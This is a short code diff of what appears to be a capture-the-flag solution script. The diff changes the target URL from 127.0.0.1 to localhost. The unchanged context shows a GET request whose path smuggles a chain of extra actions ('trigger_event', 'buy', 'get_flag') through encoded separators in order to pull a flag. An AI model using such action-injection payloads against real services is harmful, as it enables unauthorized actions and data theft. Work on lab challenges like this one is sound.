@@ -33,7 +33,7 @@ def decryption(payload):
 
 
 def get():
-    URL = 'http://127.0.0.1:8085'
+    URL = 'http://localhost:8085'
     res = requests.get(
         URL+"/d5afe1f66147e857/?action:trigger_event%23;action:buy;7%23action:get_flag;")
     if res.status_code == 200:
